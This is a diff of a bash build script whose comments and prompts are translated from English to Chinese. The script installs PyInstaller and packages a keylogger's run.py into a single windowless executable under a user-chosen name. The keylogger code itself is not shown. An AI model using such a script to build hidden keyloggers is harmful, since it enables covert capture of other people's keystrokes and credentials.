@@ -1,39 +1,39 @@
 #!/usr/bin/env bash
 ################################################
 
-# Ensure the script is run with appropriate permissions
+# 确保脚本以适当的权限运行
 if [[ "$EUID" -ne 0 ]]; then
-    echo "Please run as root or use sudo to install packages."
+    echo "请使用 root 权限或 sudo 来安装软件包。"
     exit 1
 fi
 
-# Install pyinstaller with verbose output
-echo "Installing pyinstaller..."
+# 安装 pyinstaller（显示详细输出）
+echo "正在安装 pyinstaller..."
 pip3 install pyinstaller -v
 
-# Check if the installation was successful
+# 检查安装是否成功
 if [[ $? -ne 0 ]]; then
-    echo "Failed to install pyinstaller. Exiting."
+    echo "安装 pyinstaller 失败。正在退出。"
     exit 1
 fi
 
-# Prompt the user for the name of the Keylogger
-read -p "Enter the name you want for your Keylogger: " name
+# 提示用户输入键盘记录器的名称
+read -p "请输入您想要给键盘记录器起的名字: " name
 
-# Validate the user input
+# 验证用户输入
 if [[ -z "$name" ]]; then
-    echo "No name provided. Exiting."
+    echo "未提供名称。正在退出。"
     exit 1
 fi
 
-# Create the executable with PyInstaller
-echo "Creating executable with PyInstaller..."
+# 使用 PyInstaller 创建可执行文件
+echo "正在使用 PyInstaller 创建可执行文件..."
 pyinstaller --onefile --name "$name" --noconsole run.py
 
-# Check if PyInstaller was successful
+# 检查 PyInstaller 是否成功
 if [[ $? -eq 0 ]]; then
-    echo "Executable created successfully."
+    echo "可执行文件创建成功。"
 else
-    echo "Failed to create executable. Please check the PyInstaller output for errors."
+    echo "创建可执行文件失败。请检查 PyInstaller 的输出以了解错误详情。"
     exit 1
 fi
